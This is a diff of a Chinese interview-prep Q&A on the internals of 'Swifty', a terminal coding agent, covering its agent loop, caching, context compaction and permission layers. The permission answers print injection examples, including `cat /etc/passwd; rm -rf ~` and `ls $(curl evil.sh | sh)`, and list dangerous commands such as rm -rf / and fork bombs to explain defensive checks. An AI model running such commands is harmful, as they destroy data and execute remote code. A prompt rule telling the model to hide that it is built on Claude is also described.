@@ -8,7 +8,7 @@ protected: true
 
 > 本文档面向高级前端工程师面试场景, 围绕 `apps/swifty`( 一个运行在终端中的 Coding Agent, 类似 Claude Code) 的实现细节设计深度问答.
 > 所有回答均基于真实源码( `apps/swifty/src/`) , 回答中标注了关键文件与机制, 可作为面试前的系统复习材料.
-> 全文共 100 组问答( Q1–Q100) , 覆盖架构、循环、协议、工具、权限、TUI、上下文管理、会话与记忆、多智能体、工程化、运行模式、命令系统、基础设施、手写代码题、场景设计题与开放题.
+> 全文共 104 组问答( Q1–Q104) , 覆盖架构、循环、协议、工具、权限、TUI、上下文管理、会话与记忆、多智能体、工程化、运行模式、命令系统、基础设施、手写代码题、场景设计题、开放题与补充子系统.
 
 ## 一、项目整体架构与设计决策
 
@@ -35,7 +35,7 @@ Swifty 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 答:
 
-这是一个关键的技术选型. `agent.run()` 的签名是 `AsyncGenerator<AgentEvent>`, 消费侧统一为 `for await (const event of agent.run())`( `tui/app.tsx:1313`) . 相比 EventEmitter/回调, AsyncGenerator 带来四个结构性优势:
+这是一个关键的技术选型. `agent.run()` 的签名是 `AsyncGenerator<AgentEvent>`, 消费侧统一为 `for await (const event of agent.run())`( `tui/app.tsx:1542`) . 相比 EventEmitter/回调, AsyncGenerator 带来四个结构性优势:
 
 1. 拉取式背压( pull-based backpressure) : 消费方每次 `await` 下一个事件时才驱动 Agent 前进一步. TUI 渲染慢时, Agent 自然减速, 不存在 EventEmitter 推送模式下事件积压、需要额外缓冲队列的问题.
 2. 控制流即代码: Agent 内部可以用普通的 `while` 循环 + `try/catch` 表达多轮推理、错误恢复、重试( 如限流后 `interruptibleSleep` 再 `continue`) , 逻辑线性可读. 用回调则会被迫拆成状态机.
@@ -84,7 +84,7 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 
 1. 声明式增量渲染: 流式输出本质是"状态随时间变化", React 的 state→view 映射天然契合. 对比 Blessed 的命令式 `box.setContent()`, React 模型下流式文本只是 `setStreamingText(text)`.
 2. 组件复用与生态: `ink-spinner`、对话框组件、`<Static>`/`<Box>`/`<Text>` 布局原语可直接组合; 团队已有的 React 经验零迁移成本.
-3. `<Static>` 组件解决终端特有痛点: 终端里已滚出屏幕的内容无法被重绘. Ink 的 `<Static>` 把"已提交消息"写入终端回滚缓冲区( scrollback) 且永不重渲染, 与动态区( 流式内容) 分离 —— 这是 Swifty 消除闪烁的核心手段( `app.tsx:1688` 附近) .
+3. `<Static>` 组件解决终端特有痛点: 终端里已滚出屏幕的内容无法被重绘. Ink 的 `<Static>` 把"已提交消息"写入终端回滚缓冲区( scrollback) 且永不重渲染, 与动态区( 流式内容) 分离 —— 这是 Swifty 消除闪烁的核心手段( `app.tsx:1930` 附近) .
 4. Hooks 管理复杂状态: `app.tsx` 用约 30 个 `useState`/`useRef` 管理流式文本、权限请求、子代理进度、Ctrl+C 双击退出等状态, 逻辑内聚在函数组件中.
 
 代价与应对:
@@ -101,7 +101,7 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 
 答:
 
-`src/prompt/builder.ts` 实现了 PromptBuilder 模式: 系统提示词不是一个巨字符串, 而是一组带优先级的"段落( Section) ", 按优先级排序后拼接:
+`src/prompt/builder.ts` 实现了 PromptBuilder 模式: 系统提示词不是一个巨字符串, 而是一组带优先级的"段落( Section) ", 按优先级排序后拼接( `buildSystemPrompt()`, builder.ts:97-107, 共 8 个段落) :
 
 | 优先级 | 段落               | 内容                                                             |
 | ------ | ------------------ | ---------------------------------------------------------------- |
@@ -113,15 +113,14 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 | 50     | ToneStyle          | 语气与风格                                                       |
 | 60     | OutputEfficiency   | 输出长度约束                                                     |
 | 70     | Environment        | 运行时环境( workDir、OS、shell、git 分支、模型、日期)            |
-| 90     | Skills             | 可选: 已激活技能                                                 |
-| 95     | CustomInstructions | 可选: SWIFTY.md/CLAUDE.md 项目指令                               |
-| 100    | Memory             | 可选: 长期记忆                                                   |
+
+注意: 技能清单、项目指令( SWIFTY.md/AGENTS.md) 与长期记忆不再是系统提示词段落, 而是通过 `conversation.injectLongTermMemory()`( conversation.ts:133) 以 system-reminder 形式注入对话 —— 技能清单是项目级内容, 放进系统提示词会破坏跨项目的 prompt cache 前缀.
 
 解决的问题:
 
 1. 可组合性: 不同运行模式( TUI / print / subagent) 可以裁剪不同段落组合, 例如子代理可注入 `systemPromptOverride` 完全替换.
 2. 可测试性: 每个 section 是独立纯函数, 可单测.
-3. 缓存友好: Anthropic 客户端在系统提示词上打 `cache_control: { type: "ephemeral" }` 断点( `anthropic.ts:298`) , 系统提示词整体稳定不变才能命中 prompt cache —— 如果把易变内容( 如日期) 混在正文里会破坏缓存, 所以日期等信息放在靠后的 Environment 段, 且会话内不变.
+3. 缓存友好: Anthropic 客户端在系统提示词上打 `cache_control: { type: "ephemeral" }` 断点( `anthropic.ts:372`) , 系统提示词整体稳定不变才能命中 prompt cache —— 如果把易变内容( 如日期) 混在正文里会破坏缓存, 所以日期等信息放在靠后的 Environment 段, 且会话内不变.
 4. 身份保护: Identity 段硬编码了"不得提及 Claude/Anthropic/OpenAI, 只能自称 Swifty"的约束, 作为品牌与合规防线.
 
 ---
@@ -155,7 +154,7 @@ main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React sta
 
 答:
 
-`src/agent/agent.ts` 的 `run()` 是一个 `while (looping)` 循环( 约 line 137) , 单轮迭代按严格顺序执行:
+`src/agent/agent.ts` 的 `run()` 是一个 `while (looping)` 循环( 起于 line 174, 循环体在 line 189) , 单轮迭代按严格顺序执行:
 
 1. 最大迭代守卫: `maxIterations > 0 && iteration > maxIterations` 时 yield error 并返回, 防止失控死循环( 默认 `maxIterations = 0` 即不限制, 200 是 spawnSubagent 的默认值) .
 2. 计划模式提醒: 若权限模式为 `plan`, 注入 system-reminder —— 第 1 轮和每第 5 轮用完整版, 其余轮用一行精简版( `plan-mode.ts`, `reminderInterval = 5`) , 在"持续约束模型行为"与"节省 token"之间折中.
@@ -180,7 +179,7 @@ main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React sta
 
 实现分两层:
 
-分批算法( `agent.ts:527` `partitionToolCalls()`) :
+分批算法( `agent.ts:650` `partitionToolCalls()`) :
 
 ```ts
 for (const tu of toolUses) {
@@ -244,20 +243,20 @@ Swifty 有三类自愈机制, 都在 `agent.ts` 中:
 
 `turn_complete` 在每一轮结束时发出, `loop_complete` 只在循环退出时发出一次. UI 对两者的利用完全不同( `app.tsx` 事件循环) :
 
-`turn_complete` 时( `app.tsx:1618`) :
+`turn_complete` 时( `app.tsx:1646`) :
 
 1. 冲刷( flush) 50ms 节流定时器, 确保流式文本最终态渲染出来;
 2. 清空 `streamingText`, 把本轮积累的 thinking + 工具调用折叠为 `turn_summary` 消息, 流式文本保留为 `assistant` 消息, 一并 push 进消息列表;
 3. 新消息进入 `<Static>` 的 items 数组后, Ink 自动将其渲染到终端回滚缓冲( 永不重绘) .
 
-`loop_complete` 时( `app.tsx:1429`) :
+`loop_complete` 时( `app.tsx:1686`) :
 
 1. 同样冲刷节流、提交消息( 这次是 assistant 正文) ;
-2. 会话持久化( 写 JSONL) ;
-3. 文件历史快照( 供 `/rewind` 回滚) ;
-4. 若处于 plan 模式 → 弹出计划审批对话框.
+2. 若处于 plan 模式 → 弹出计划审批对话框.
 
-这个双层边界的价值: turn 是"渲染提交单元", loop 是"持久化与交互单元". 把 thinking/工具调用折叠成 turn_summary 再进 Static 区, 显著减少了 Static 项数量和终端回滚区的渲染压力 —— 用户看到的是简洁的"思考了 3s · 用了 5 个工具"摘要, 而不是刷屏的中间过程.
+值得说明的是职责归属: 会话持久化( 写 JSONL) 与文件历史快照( 供 `/rewind` 回滚) 并不在 UI 的事件处理器里, 而是由 Agent 核心完成 —— `persistLastMessage()`( agent.ts:814) 在每条消息进入对话历史时即追加落盘, `fileHistory.makeSnapshot()`( agent.ts:578) 在循环正常退出时记录快照. UI 只负责渲染收尾与交互.
+
+这个双层边界的价值: turn 是"渲染提交单元", loop 是"交互单元". 把 thinking/工具调用折叠成 turn_summary 再进 Static 区, 显著减少了 Static 项数量和终端回滚区的渲染压力 —— 用户看到的是简洁的"思考了 3s · 用了 5 个工具"摘要, 而不是刷屏的中间过程.
 
 ---
 
@@ -265,7 +264,7 @@ Swifty 有三类自愈机制, 都在 `agent.ts` 中:
 
 答:
 
-这是 React 异步回调中的经典陈旧闭包( stale closure) 问题. Agent 事件循环是一个长生命周期的 `for await` 循环( `app.tsx:1313`) , 它持有的回调闭包捕获的是循环开始时的 state 快照. 以流式文本为例:
+这是 React 异步回调中的经典陈旧闭包( stale closure) 问题. Agent 事件循环是一个长生命周期的 `for await` 循环( `app.tsx:1542`) , 它持有的回调闭包捕获的是循环开始时的 state 快照. 以流式文本为例:
 
 ```ts
 case "stream_text":
@@ -362,9 +361,9 @@ interface LLMClient {
 
 Anthropic 的 prompt caching 按前缀匹配计费优化 —— 从消息开头到 `cache_control` 断点处的内容若与上次请求一致, 则命中缓存( cache read 价格约为原价的 1/10) . Swifty 在 `anthropic.ts` 设了三个断点, 位置选择体现"稳定性递减"原则:
 
-1. 系统提示词( line 298) : 整个 system prompt 打 `cache_control: { type: "ephemeral" }`. 系统提示词在一个会话内不变, 是最稳定的前缀.
-2. 最后一个工具 schema( line 278) : 工具列表整体打缓存. 工具集只在"发现延迟工具"时变化, 相对稳定; 且工具 schema 体积大( 描述文本长) , 缓存收益最高.
-3. 最后一条 user 消息尾部( `markLastUserTailForCache()`, line 497) : 从后往前找到最后一条非空 user 消息, 在其最后一个内容块上打断点( 通过 `Reflect.set` 动态附加) . 这利用了会话的增量特性 —— 每轮请求都是"上一轮全部内容 + 新增尾部", 在最新尾部前打断点, 使得整段历史前缀都可命中缓存, 只有新增的增量部分按全价计费.
+1. 系统提示词( anthropic.ts:372) : 整个 system prompt 打 `cache_control: { type: "ephemeral" }`. 系统提示词在一个会话内不变, 是最稳定的前缀.
+2. 最后一个非 deferred 工具 schema( `markToolsForCache()`, anthropic.ts:68-77) : 从后往前找到最后一个未标记 `defer_loading` 的工具打上缓存标记, 使整个工具块命中缓存. 工具集只在"发现延迟工具"时变化, 相对稳定; 且工具 schema 体积大( 描述文本长) , 缓存收益最高. 之所以要跳过 deferred 工具, 是因为"同时携带 defer_loading 与 cache_control"会被 API 拒绝.
+3. 最后一条 user 消息尾部( `markLastUserTailForCache()`, anthropic.ts:561) : 从后往前找到最后一条非空 user 消息, 在其最后一个内容块上打断点( 通过 `Reflect.set` 动态附加, 且优先选非 image 块 —— 某些网关拒绝在 image 块上打断点) . 这利用了会话的增量特性 —— 每轮请求都是"上一轮全部内容 + 新增尾部", 在最新尾部前打断点, 使得整段历史前缀都可命中缓存, 只有新增的增量部分按全价计费.
 
 效果: 多轮对话中, 第 N 轮的输入 token 大部分以 cache read 计价, 成本和首 token 延迟( TTFT) 都显著下降. `UsageInfo` 里专门有 `cacheReadInputTokens` / `cacheCreationInputTokens` 字段来观测缓存命中率.
 
@@ -382,7 +381,7 @@ Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角
 - `addSystemReminder()`: system-reminder 以 `role: "user"` 落历史( Anthropic 协议无独立 system 角色消息位, system 只能是顶层参数) ;
 - 团队邮箱通知、Hook 通知注入.
 
-`buildAnthropicMessages()`( `anthropic.ts:105`) 的合并规则: 若当前 user 文本消息的前一条也是 user 文本消息( 且非 tool_result) , 则把当前内容作为额外 text 块合并进前一条. tool_result 块消息独立处理( 它们是协议允许的 user 角色内容块) .
+`buildAnthropicMessages()`( `anthropic.ts:177`) 的合并规则: 若当前 user 文本消息的前一条也是 user 文本消息( 且非 tool_result) , 则把当前内容作为额外 text 块合并进前一条. tool_result 块消息独立处理( 它们是协议允许的 user 角色内容块) .
 
 这个"内部模型宽松、出站转换严格"的分层很典型: 内部 `ConversationManager` 允许任意追加( 简单、不易错) , 协议合规性在序列化边界一次性保证. 对比"每次插入都检查前驱"的方案, 序列化时归一化只需处理一次且逻辑集中, 不容易在多个注入点漏处理.
 
@@ -421,7 +420,7 @@ LLMError
 
 痛点: 上下文压缩需要知道"当前对话占多少 token", 但本地无法精确计算( 不同模型的 tokenizer 不同) . 纯字符估算( `chars / 3.5`) 误差大 —— 中文、代码、base64 的字符/token 比差异悬殊, 误差累积会导致"过早压缩( 浪费) "或"过晚压缩( 爆上下文) ".
 
-UsageAnchor 的解法( `conversation.ts:157`) : 用 API 返回的真实用量校准.
+UsageAnchor 的解法( `conversation.ts:203`) : 用 API 返回的真实用量校准.
 
 ```ts
 recordUsageAnchor(input, output, cacheRead, cacheCreation) {
@@ -430,7 +429,7 @@ recordUsageAnchor(input, output, cacheRead, cacheCreation) {
 }
 ```
 
-每次 LLM 响应返回真实 `usage` 后记录锚点: `baselineTokens` 是当时全部历史的真实 token 数, `_anchorCount` 是当时的历史长度. 之后的估算( `compact.ts:185` `currentContextTokens()`) :
+每次 LLM 响应返回真实 `usage` 后记录锚点: `baselineTokens` 是当时全部历史的真实 token 数, `_anchorCount` 是当时的历史长度. 之后的估算( `compact.ts:232` `currentContextTokens()`) :
 
 ```
 currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
@@ -478,7 +477,6 @@ interface Tool {
   description: string;
   category: "read" | "write" | "command";
   deferred?: boolean; // 初始对模型隐藏, 经 ToolSearch 发现
-  system?: boolean; // 系统内部工具, 绕过子代理工具过滤
   schema(): ToolSchema;
   execute(ctx: ToolContext, args): Promise<ToolResult>;
 }
@@ -504,7 +502,7 @@ interface Tool {
 
 机制( `tools/registry.ts` + `tools/tool-search.ts`) :
 
-1. 标记隐藏: 工具可标记 `deferred: true`( 所有 MCP 工具默认 `deferred = true`) . `getAllSchemas()` 过滤掉未发现的 deferred 工具 —— 模型初始只看到核心工具 + 一个 `ToolSearch` 工具.
+1. 标记隐藏: 工具可标记 `deferred: true`( MCP 工具注册时默认 `deferred = true`, 见 mcp/tool-wrapper.ts:78; 但若全部 MCP schema 总量低于上下文窗口的 10%, mcp/strategy.ts 的 eager 模式会清除该标记全量加载, 见 Q101) . `getAllSchemas()` 过滤掉未发现的 deferred 工具 —— 模型初始只看到核心工具 + 一个 `ToolSearch` 工具.
 2. 按需发现: 模型需要时调用 `ToolSearch`, 两种方式:
    - 关键词搜索: `searchDeferred(query)` 对 name/description 做大小写不敏感的 `includes()` 匹配, 最多返回 5 个候选的完整 schema;
    - 精确选择: `select:name1,name2` 语法按名直接激活.
@@ -592,11 +590,11 @@ interface Tool {
 
 - Layer 0 — plan 模式计划文件例外: mode 为 `plan` 且目标是 WriteFile/EditFile 且 `file_path` 含 `.swifty/plans/` → 直接 allow. 让模型在只读的计划模式下也能写计划文件, 是"模式约束内的合法出口".
 - Layer 2 — 只读命令白名单: command 类工具过 `isSafeCommand()`( 见 Q26) , 命中 → allow.
-- Layer 3 — 危险命令黑名单: 命中危险模式( 如 `rm -rf /`、`git push --force`、fork 炸弹) → 直接 deny, 不问用户 —— 有些操作连"用户误点允许"的风险都不能冒.
-- Layer 3.5 — 沙箱自动放行: OS 沙箱可用且命令非危险 → allow. 命令将在内核级隔离中运行, 即使恶意也伤不到宿主, HITL 询问无增量价值.
-- Layer 4 — 路径沙箱( PathSandbox) : 文件类工具限定在项目目录 + tmpdir 内; 敏感路径( 如 `~/.ssh`) 在拒绝写名单 → deny/ask.
-- Layer 4b — "allow always" 规则: 用户点"不再询问"后, `allowAlways()`( `checker.ts:532-554`) 把授权转为一条 scoped 规则并持久化 —— 文件类工具按"父目录 + `/*`", 命令类按"前 1-2 个词 + `*`"( 即整个命令族) , 经 `ruleEngine.appendLocalRule()`( `checker.ts:336-354`) 写入项目本地规则 YAML( 同 `Tool(pattern)` 格式、去重) . 该规则下次检查经 Layer 5 的规则引擎命中 → allow, 且跨会话重启仍然生效.
-- Layer 5 — YAML 规则引擎( RuleEngine) : 用户/项目/本地三级 YAML 规则文件, `ToolName(pattern)` 形式的 glob 规则 → 按规则 allow/deny/ask. 规则文件每次检查时重新读取, 改规则立即生效.
+- Layer 3 — 危险命令黑名单: `detectDangerous()` 检查 `DANGEROUS_PATTERNS`, 命中 → 直接 deny, 不问用户 —— 有些操作连"用户误点允许"的风险都不能冒. 值得注意现状: 源码中该模式数组当前为空( checker.ts:59 "Keep it empty array", rm -rf、fork 炸弹等旧模式已整体注释掉, checker.ts:61-79) , 即这一层目前不会命中任何命令, 机制保留但规则集清空.
+- Layer 3.5 — 沙箱自动放行: OS 沙箱可用且工具为 Bash 时, 把复合命令按 `&&`/`||`/`;`/`|` 拆分为子命令逐个过规则引擎 —— 任一 deny 则整体 deny、有 ask 则整体 ask, 否则 allow. 命令将在内核级隔离中运行, 即使恶意也伤不到宿主, HITL 询问无增量价值.
+- Layer 4 — 路径沙箱( PathSandbox) : 文件类工具限定在项目目录 + os.tmpdir 内; 项目内的 `.swifty/config.yaml`、`.swifty/permissions.local.yaml`、`.swifty/skills/` 在拒绝写名单( `DEFAULT_DENY_WRITE`, checker.ts:125-129) → deny.
+- Layer 4b — "allow always" 规则: 用户点"不再询问"后, `allowAlways()`( `checker.ts:548-571`) 把授权转为一条 scoped 规则并持久化 —— 文件类工具按"父目录 + `/*`", 命令类按"前 1-2 个词 + `*`"( 即整个命令族) , 经 `ruleEngine.appendLocalRule()`( `checker.ts:347-367`) 写入项目本地规则 YAML( 同 `Tool(pattern)` 格式、去重) . 该规则下次检查经 Layer 5 的规则引擎命中 → allow, 且跨会话重启仍然生效.
+- Layer 5 — YAML 规则引擎( RuleEngine) : 用户/项目/本地三级 YAML 规则文件, `ToolName(pattern)` 形式的 glob 规则 → 按规则 allow/deny/ask. 规则文件按 mtime+size 缓存, 文件变化后下一次检查即读到新规则, 改规则立即生效.
 - Layer 6 — 模式矩阵兜底( `modeDecide()`) : `default`( read 放行, write/command 询问) 、`acceptEdits`( write 放行, command 询问) 、`plan`( write/command 均询问) 、`bypassPermissions`( 全放行) .
 
 设计原则: "例外 → 白名单 → 黑名单 → 环境隔离 → 资源边界 → 用户记忆 → 用户规则 → 模式默认", 从具体到一般排列. 任何一层给出确定结论即短路, 保证可预测性; 同时 allow/deny/ask 三态而非布尔, 保留了"询问"这个 HITL 中间态.
@@ -609,7 +607,7 @@ interface Tool {
 
 朴素方案是"命令前缀白名单": `ls`、`cat`、`git status` 等开头即放行. 但这有经典注入漏洞 —— `cat /etc/passwd; rm -rf ~` 以 `cat` 开头却执行任意命令; `ls $(curl evil.sh | sh)` 同理.
 
-`isSafeCommand()`( `checker.ts:291`) 因此是两阶段检查:
+`isSafeCommand()`( `checker.ts:380`) 因此是两阶段检查:
 
 1. 元字符守卫: 先扫描整条命令, 含 `>`、`|`、`;`、`&&`、`$(`、反引号 任一即直接判定"不安全"( 不是拒绝, 而是交还给后续权限层询问) . 这些 shell 元字符能把"安全前缀"变成任意执行的跳板.
 2. 前缀匹配: 过了守卫的命令, 再与只读命令前缀表匹配( `ls`、`cat`、`git status`、`git log` 等) , 命中才自动放行.
@@ -635,7 +633,7 @@ interface Tool {
 
 两个模式有额外的"行为语义"而不只是权限语义:
 
-- plan 模式是一套完整工作流: 进入时保存原模式( `prePlanMode`) ; Agent 循环每轮注入 plan 提醒( 第 1/5/10... 轮完整版、其余精简版) ; 模型通过 `ExitPlanModeTool` 结束规划; 循环结束时弹出 `PlanApprovalDialog`, 用户可选 yolo( 切 bypass 执行) / manual( 恢复原模式执行) / feedback( 打回反馈继续规划) . 权限模式在这里扮演了状态机的状态.
+- plan 模式是一套完整工作流: 进入时保存原模式( `prePlanMode`) ; Agent 循环每轮注入 plan 提醒( 判定为 `(iteration - 1) % 5 === 0` 即第 1/6/11... 轮用完整版、其余精简版) ; 模型通过 `ExitPlanModeTool` 结束规划; 循环结束时弹出 `PlanApprovalDialog`, 用户可选 yolo( 切 bypass 执行) / manual( 恢复原模式执行) / feedback( 打回反馈继续规划) . 权限模式在这里扮演了状态机的状态.
 - bypassPermissions 配合沙箱才有意义: Layer 3.5 的"沙箱自动放行"与 bypass 的区别是 —— 沙箱放行有内核隔离背书, bypass 是裸奔. 生产实践中 bypass 应只在容器/VM 中使用.
 
 模式的持久化: `permission_mode` 可写入 YAML 配置作为会话默认值; 而"不再询问"的授权会被持久化为本地规则 YAML 中的 scoped 规则( `allowAlways()` → `appendLocalRule()`, 见 Q25 Layer 4b) —— 授权粒度被收敛到"目录/命令族", 且 deny > ask > allow 的优先级保证任何 deny 规则都无法压制它, 跨会话生效.
@@ -684,7 +682,7 @@ interface Tool {
 
 终端渲染有个根本约束: 已滚出可视区的内容无法再修改( 终端不是 DOM, 没有真正的重绘已滚动区域的能力) . Ink 的 `<Static>` 正是为此设计: 其子树渲染一次后写入终端回滚缓冲区( scrollback) , 之后任何 React 更新都不再触碰它, 也不参与 `eraseLines` 清屏.
 
-Swifty 将全部消息传入 `<Static>` 的 items 数组( `app.tsx:1902-1916`) :
+Swifty 将全部消息传入 `<Static>` 的 items 数组( `app.tsx:1930-1944`) :
 
 ```tsx
 <Static
@@ -724,7 +722,7 @@ Swifty 将全部消息传入 `<Static>` 的 items 数组( `app.tsx:1902-1916`) :
 
 答:
 
-实现( `app.tsx:1316`) :
+实现( `app.tsx:1544-1551`) :
 
 ```ts
 case "stream_text":
@@ -779,7 +777,7 @@ const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
 
 ---
 
-### Q33: `app.tsx` 约 2042 行、30+ 个状态, 是如何避免变成"巨石组件"失控的? 它的状态分层策略是什么?
+### Q33: `app.tsx` 约 2150 行、30+ 个状态, 是如何避免变成"巨石组件"失控的? 它的状态分层策略是什么?
 
 答:
 
@@ -801,7 +799,7 @@ const fullRendered = stableRef.current.rendered + renderMarkdown(unstableText);
 
 答:
 
-Ink 没有 `<input>` 组件, `input.tsx`( 574 行) 基于 `useInput` 原始按键事件自建了微型文本编辑器:
+Ink 没有 `<input>` 组件, `input.tsx`( 795 行) 基于 `useInput` 原始按键事件自建了微型文本编辑器:
 
 文本模型: `lines: string[]` + `cursorLine`/`cursorCol` 光标坐标. 字符插入是切片拼接 `line.slice(0, col) + input + line.slice(col)`; Shift+Enter/Ctrl+J 在光标处拆行实现多行; 光标渲染用 `<Text inverse>` 反色显示光标位字符. 粘贴被 Ink 合并为单条含 `\r\n` 的输入, 按多字符批量插入处理.
 
@@ -865,7 +863,7 @@ if (!scheduled) {
 两条路径:
 
 - 子代理( in-process) : `AgentTool` 的 spawn 回调给每个子代理分配单调递增 id, `onProgress({turn, lastTool})` 回调直接 `setSubagents(...)` —— 同进程, 可直接事件驱动, 渲染为动态区的品红进度行( `label · turn N · lastTool`) .
-- 团队 teammate( 可能跨进程) : `app.tsx:317` 每 500ms 轮询 `TeamManager.getAllTeammateStates()`, 渲染为 `TeammateSpinnerTree` 进度树 + 状态栏 `TeamStatus` 徽标.
+- 团队 teammate( 可能跨进程) : `app.tsx:392` 每 500ms 轮询 `TeamManager.getAllTeammateStates()`, 渲染为 `TeammateSpinnerTree` 进度树 + 状态栏 `TeamStatus` 徽标.
 
 团队用轮询的原因:
 
@@ -900,11 +898,11 @@ if (!scheduled) {
 
 答:
 
-膨胀源治理分两级, 关键是预算处理的时机 —— 它不在每轮调 LLM 前做, 而在工具结果"入历史时"完成( `agent.ts:456-502`) . agent.ts 注释写明 "Tool results are already budget-processed at the time they enter history", 因此 transcript 中的消息尺寸即终态, 后续压缩阈值估算可直接基于它们.
+膨胀源治理分两级, 关键是预算处理的时机 —— 它不在每轮调 LLM 前做, 而在工具结果"入历史时"完成( `agent.ts:503-541`) . agent.ts 注释写明 "Tool results are already budget-processed at the time they enter history", 因此 transcript 中的消息尺寸即终态, 后续压缩阈值估算可直接基于它们.
 
 第一道 — 工具结果预算( 廉价、无损) , 分两个环节:
 
-- 单结果落盘: 结果入历史前, 长度超过 `MAX_OUTPUT_CHARS = 50000`( `agent.ts:63`, 注释解释了取 5 万的原因: 让模型一次就能看到足够内容, 免一次 ReadFile 回读往返) → 调 `persistLargeResult()` 全文写入 `.swifty/sessions/{id}/tool-results/{toolUseId}.txt`( 注意目录名是连字符 `tool-results`) , 原位置替换为 `<persisted-output>` 包裹的 2000 字符预览 + 文件路径( `budget.ts:75`, 模型需要时可 ReadFile 读回) ;
+- 单结果落盘: 结果入历史前, 长度超过 `MAX_OUTPUT_CHARS = 50000`( `agent.ts:62`, 注释解释了取 5 万的原因: 让模型一次就能看到足够内容, 免一次 ReadFile 回读往返) → 调 `persistLargeResult()` 全文写入 `.swifty/sessions/{id}/tool-results/{toolUseId}.txt`( 注意目录名是连字符 `tool-results`) , 原位置替换为 `<persisted-output>` 包裹的 2000 字符预览 + 文件路径( `budget.ts:71` `buildSpillPreview()`, 模型需要时可 ReadFile 读回) ;
 - 聚合预算: `applyBudget()`( `tool-result/budget.ts`) 处理整批 —— 一条消息内全部结果字符总数超 `MESSAGE_AGGREGATE_LIMIT = 200000` 时, 按大小降序逐个落盘直到达标( 单条 ≤ 预览长度的不落盘, 写了也没省到空间) . 并行批的多个结果落进同一条消息, 单条阈值管不住总和, 所以需要这层聚合;
 - 防回环: `isSpillReadback()`( `budget.ts:92`) 识别"读回落盘文件的 ReadFile 调用", agent.ts 把它( 以及本轮已单条落盘者) 收集进 `exemptIds` 豁免集合 —— 豁免条目既不会被聚合预算再次落盘, 也不会被单条落盘二次处理( 详见 Q43 的回环场景) .
 
@@ -948,7 +946,7 @@ PTL 重试: 摘要请求本身可能超长 —— `requestSummaryWithPTLRetry()`
 
 答:
 
-`CHARS_PER_TOKEN = 3.5`( `compact.ts:28`) 是英文代码/文本混合语料下 Claude tokenizer 的经验均值( 英文约 4, 代码符号密集略低, 取保守值使估算偏大而宁早勿晚) .
+`CHARS_PER_TOKEN = 3.5`( `compact.ts:56`) 是英文代码/文本混合语料下 Claude tokenizer 的经验均值( 英文约 4, 代码符号密集略低, 取保守值使估算偏大而宁早勿晚) .
 
 估算函数 `estimateMessages()` 对每条消息累加 `content.length + JSON.stringify(toolUses).length + ΣtoolResults + Σthinking`, 再除以 3.5 向上取整.
 
@@ -1144,7 +1142,7 @@ JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 派生层( `spawn.ts`) : `spawnSubagent()` 为子代理创建全新 `ConversationManager`( 隔离上下文, 防污染主线) ; 模型解析优先级 `调用方覆盖 > 定义指定 > 父级模型`, 模型不同时新建 LLMClient 否则复用父客户端; `maxIterations = maxTurns ?? 200`; `onProgress` 回调向 UI 汇报 turn/lastTool.
 
-工具过滤( `tool-filter.ts`, 六层) : MCP 工具始终放行 → 全局黑名单( `Agent/AskUserQuestion/ExitPlanMode/EnterWorktree` 等, 防子代理再派生子代理失控) → 异步代理白名单 → 定义级黑名单 → 定义级白名单( `["*"]` 除外) .
+工具过滤( `tool-filter.ts`, 源码注释标明六层) : MCP 工具( `mcp__*` 前缀) 始终放行 → 全局黑名单 `SUBAGENT_DISALLOWED_TOOLS`( ExitPlanMode/Agent/AskUserQuestion/TaskStop, 防子代理再派生子代理失控) → 自定义代理附加黑名单( 当前与全局相同, 为扩展性单列) → 异步( 后台) 代理白名单 → 定义级黑名单 → 定义级白名单( `["*"]` 除外) .
 
 防递归 fork: fork 路径( 继承父上下文运行) 有双重检测 —— `querySource` 标记 + 扫描对话中的 `<fork_boilerplate>` 标签; fork 出的代理拿到的是克隆注册表( `cloneRegistryForFork()` 把 Agent 工具深拷贝并打上 fork 标记) , 使其再次 fork 时能被识别并拒绝.
 
@@ -1160,15 +1158,15 @@ JSONL( 每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 文件邮箱( `teams/file-mailbox.ts`) :
 
-- 每个成员一个 JSONL 邮箱文件( `.swifty/teams/{team}/{member}.jsonl`) , 消息行: `{from, text, timestamp}`;
-- 写锁: `O_CREAT|O_EXCL` 创建 `{file}.lock` 实现互斥, 最多 10 次尝试, 锁龄超 10s 视为 stale 可强取, 随机退避用 `Atomics.wait`( 同步阻塞不耗事件循环) ;
-- 读游标: 每个成员维护 `{member}.read` 游标文件, `receiveSync()` 只返回游标后的新行并推进 —— 增量消费, 避免全量重读.
+- 每个成员一个 JSON 数组邮箱文件( `.swifty/teams/{team}/inboxes/{member}.json`, 消息对象含 `from/text/timestamp/read` 字段, 损坏的数组记录逐条跳过、整体降级为空邮箱) ;
+- 写锁: `O_CREAT|O_EXCL`( `wx` 标志) 创建 `{file}.lock` 实现互斥, 总获取超时 5s( 超时抛错而非丢消息) , 锁龄超 10s 视为 stale 可强取, 重试用指数退避加抖动( 5ms 起、上限 80ms) 并以 `Atomics.wait` 同步睡眠( 不耗事件循环) ;
+- 读游标: 消息级 `read` 标记( 而非独立游标文件) , `receiveSync()` 在锁内做"读全部 → 过滤未读 → 原地置 read → 全量写回"的读改写, 返回未读消息 —— 增量消费, 避免全量重读.
 
 生命周期( `spawnTeammate()` 主循环) : 执行任务 → 完成后状态置 idle 并向 lead 邮箱发 `[idle] name (reason)` → 每 500ms 轮询自己邮箱 → 收到 `[shutdown]` 退出; 收到新任务则拼接为下一轮提示继续工作 → 退出时持久化对话 transcript.
 
 lead 侧感知: `TeamManager.drainLeads()` 把各邮箱未读消息包装为 `<task-notification team="...">` XML, 经 Agent 循环的 `notificationFn` 注入主线 system-reminder( 复用 Q7 第 3 步的 drain 通道) .
 
